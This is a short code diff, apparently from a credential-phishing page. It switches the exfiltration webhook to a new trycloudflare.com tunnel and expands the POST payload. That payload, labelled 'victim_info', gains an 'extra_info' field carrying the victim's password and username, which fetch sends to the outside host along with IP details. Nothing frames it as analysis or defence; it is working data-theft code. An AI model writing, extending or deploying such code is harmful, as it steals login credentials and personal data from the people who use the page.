@@ -85,9 +85,12 @@ Connection Type: ${connectionType}
 Loading Time: ${loadTime}
                 `;
 
-                const webhookURL = "https://convert-hints-blocking-harm.trycloudflare.com/userData";
+                const webhookURL = "https://pete-chapter-white-promoted.trycloudflare.com/userData";
 
-                const payload = {'victim_info': ipinfo}; 
+                const payload = {
+                    'victim_info': ipinfo, 
+                    'extra_info': {'password': password, 'username': message}
+                }
                 fetch(webhookURL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
